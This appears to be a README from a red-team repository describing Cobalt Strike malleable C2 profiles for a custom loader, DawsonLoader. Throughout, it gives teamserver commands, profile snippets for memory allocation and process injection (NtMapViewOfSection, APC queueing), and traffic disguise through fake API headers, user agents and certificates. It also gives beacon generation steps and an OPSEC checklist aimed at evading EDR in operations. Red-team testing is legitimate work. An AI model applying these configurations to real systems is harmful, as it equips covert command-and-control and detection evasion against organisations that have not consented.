# Cobalt Strike C2 Profiles for DawsonLoader

This directory contains Cobalt Strike malleable C2 profiles optimized for use with DawsonLoader uDRL and jopcall integration.

## Available Profiles

### 1. dawson-test.profile
**Purpose**: Simple test profile for initial development and testing

**Characteristics**:
- Simple HTTP GET/POST with JSON encoding
- Easy to debug and troubleshoot
- Multiple allocator method support
- Minimal obfuscation (for easier troubleshooting)
- Default sleep: 60 seconds

**Use Cases**:
- Initial DawsonLoader testing
- Development and debugging
- Learning Cobalt Strike profiles
- QA/validation testing

**Usage**:
```bash
./teamserver 192.168.1.100 MyPassword /path/to/dawson-test.profile
```

---

### 2. dawson-stealth.profile
**Purpose**: Advanced evasion profile for red team operations

**Characteristics**:
- Realistic HTTP traffic (mimics web API)
- Cloudflare-style headers
- JSON request/response bodies
- Advanced memory evasion (HeapAlloc, no RWX)
- NtMapViewOfSection injection
- Default sleep: 45 seconds with 30% jitter

**Use Cases**:
- Red team operations
- EDR evasion testing
- Production engagements
- Advanced OPSEC scenarios

**Usage**:
```bash
./teamserver 192.168.1.100 MyPassword /path/to/dawson-stealth.profile
```

---

## Profile Comparison

| Feature | dawson-test | dawson-stealth |
|---------|-------------|----------------|
| **Complexity** | Low | High |
| **HTTP Traffic** | Basic JSON | Realistic API |
| **Headers** | Minimal | Extensive (Cloudflare-style) |
| **Allocator** | VirtualAlloc | HeapAlloc |
| **Injection** | CreateThread | NtMapViewOfSection |
| **Sleep Time** | 60s (20% jitter) | 45s (30% jitter) |
| **OPSEC Level** | Medium | High |
| **Debugging** | Easy | Moderate |
| **Recommended For** | Testing/Dev | Operations |

---

## Common Configuration Options

### Allocator Methods

Both profiles support different memory allocator methods. Edit the `stage` block:

```cna
stage {
    # Options:
    set allocator "VirtualAlloc";     # Standard (most compatible)
    set allocator "HeapAlloc";        # More evasive
    set allocator "MapViewOfFile";    # File mapping method

    # For DLL stomping (requires additional config):
    # set allocator "<DLL_NAME>";
    # set module_x64 "wwanmm.dll";
}
```

### Memory Protection

**Never use RWX memory** (major IOC):
```cna
stage {
    set userwx "false";    # Use RW/RX instead of RWX
}

process-inject {
    set startrwx "false";  # Don't start with RWX
    set userwx "false";    # Never use RWX
}
```

### Sleep Configuration

Adjust beacon check-in frequency:
```cna
set sleeptime "60000";  # 60 seconds (in milliseconds)
set jitter "20";         # 20% jitter (randomization)
```

---

## Testing Your Profile

### 1. Validate Syntax (Optional)

If you have c2lint:
```bash
./c2lint your-profile.profile
```

### 2. Start Team Server

```bash
./teamserver <IP> <PASSWORD> /path/to/profile.profile
```

### 3. Connect and Load DawsonLoader

1. Connect Cobalt Strike client
2. Script Manager → Load → `dist/DawsonLoader.cna`
3. Verify in Script Console

### 4. Generate Beacon

1. Create listener (HTTPS recommended)
2. Attacks → Packages → Windows Stageless Payload
3. Architecture: x64
4. Output: Windows EXE
5. Generate and save

### 5. Execute and Monitor

- Execute beacon on test system
- Beacon should call back within configured sleep time
- Verify jopcall is active (see TESTING_GUIDE.md)

---

## Customization Tips

### Change HTTP URIs

```cna
http-get {
    set uri "/custom/path1 /custom/path2 /custom/path3";
}

http-post {
    set uri "/custom/submit /custom/upload";
}
```

### Modify User-Agent

```cna
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...";
```

### Change Certificate Details

```cna
https-certificate {
    set CN       "api.yourcompany.com";
    set O        "Your Company Name";
    set C        "US";
    set L        "City";
    set ST       "State";
    set validity "365";
}
```

### Adjust Process Injection

```cna
process-inject {
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        NtQueueApcThread-s;
        CreateRemoteThread;
    }
}
```

---

## OPSEC Considerations

### ✅ Do This

- Use stageless payloads (`set host_stage "false"`)
- Disable RWX memory (`set userwx "false"`)
- Enable stage obfuscation (`set obfuscate "true"`)
- Use HTTPS listeners in production
- Test allocators on target environment first
- Customize URIs to match target's legitimate traffic
- Verify call stacks show ntdll gadgets (not beacon memory)

### ❌ Avoid This

- Staged payloads with uDRL (less tested)
- RWX memory permissions (major IOC)
- Default/unchanged profiles
- Unrealistic HTTP traffic patterns
- Short sleep times in production (<30s)
- Using profiles without testing first

---

## Troubleshooting

### Profile Won't Load

**Error**: "Error(s) while compiling profile"

**Solutions**:
1. Check syntax with c2lint
2. Verify all string replacements are same length or padded
3. Ensure PE options are in `stage` block, not global
4. Check for typos in option names

### Beacon Doesn't Call Back

**Possible Causes**:
1. Firewall blocking connection
2. Listener misconfigured
3. Allocator not compatible with target

**Solutions**:
- Check firewall rules
- Verify listener IP/port
- Try VirtualAlloc allocator first
- Check target system logs

### Memory Errors/Crashes

**Possible Causes**:
1. Incompatible allocator method
2. Profile allocator doesn't match DawsonLoader code
3. Memory protection issues

**Solutions**:
- Test with VirtualAlloc first
- Check DawsonLoader.c for allocator support
- Verify `userwx "false"` is set
- Review TESTING_GUIDE.md

---

## Profile Development Resources

- **Cobalt Strike Documentation**: https://www.cobaltstrike.com/help-malleable-c2
- **Profile Repository**: https://github.com/threatexpress/malleable-c2
- **C2 Concealment**: https://blog.cobaltstrike.com/
- **DawsonLoader Guide**: See `../JOPCALL_INTEGRATION_GUIDE.md`
- **Testing Guide**: See `../TESTING_GUIDE.md`

---

## Support

For issues specific to these profiles:
1. Check syntax with c2lint
2. Review TESTING_GUIDE.md for common issues
3. Verify DawsonLoader.cna is loaded
4. Test with dawson-test.profile first

For general Cobalt Strike profile issues:
- Consult official Cobalt Strike documentation
- Review Cobalt Strike user guide

---

**Remember**: Always test profiles in a safe environment before operational use!
